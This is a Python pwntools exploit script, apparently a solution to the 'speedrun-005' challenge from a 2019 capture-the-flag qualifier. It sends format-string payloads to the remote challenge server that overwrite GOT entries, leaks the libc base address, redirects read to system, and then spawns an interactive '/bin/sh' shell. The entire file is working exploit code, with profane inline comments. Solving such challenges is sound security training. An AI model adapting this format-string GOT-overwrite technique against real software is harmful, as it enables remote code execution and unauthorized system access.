from pwn import *

target = ELF('./speedrun-005')

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('../libc6_2.27-3ubuntu1_amd64.so')

# r = process('./speedrun-005')
r = remote('speedrun-005.quals2019.oooverflow.io', 31337)

payload = ''
buf_front_arg = 6
first_specify_arg = 20
prev = len(payload)
for i in range(8):
	# next = 0x40069d >> i * 8 & 0xff
	next = 0x40072d >> i * 8 & 0xff	# fuck
	diff = (next - prev + 255) % 256 + 1
	payload += '%{0:d}c%{1:d}$hhn'.format(diff, first_specify_arg + i)
	prev = next
payload += '%{}$shoge'.format(first_specify_arg + 8)
payload += 'A' * ((first_specify_arg - buf_front_arg) * 8 - len(payload))
for i in range(8):
	# payload += p64(target.got['puts'] + i)
	payload += p64(target.got['__stack_chk_fail'] + i)	# fuck
payload += p64(target.got['setvbuf'])
r.sendlineafter('What do you mean this time? ', payload)

# LIBC_BASE = u64(r.recvuntil('hoge')[-10:-4] + '\x00\x00') - libc.symbols['setvbuf']
LIBC_BASE = u64(r.recvuntil('hoge')[-10:-4] + '\x00\x00') - libc.symbols['alarm']	# fuck
log.info(hex(LIBC_BASE))

payload = ''
buf_front_arg = 6
first_specify_arg = 20
prev = len(payload)
for i in range(8):
	next = LIBC_BASE + libc.symbols['system'] >> i * 8 & 0xff
	diff = (next - prev + 255) % 256 + 1
	payload += '%{0:d}c%{1:d}$hhn'.format(diff, first_specify_arg + i)
	prev = next
payload += 'A' * ((first_specify_arg - buf_front_arg) * 8 - len(payload))
for i in range(8):
	# payload += p64(target.got['printf'] + i)
	payload += p64(target.got['read'] + i)	# fuck
r.sendlineafter('What do you mean this time? ', payload)

r.sendline('/bin/sh')

r.interactive()
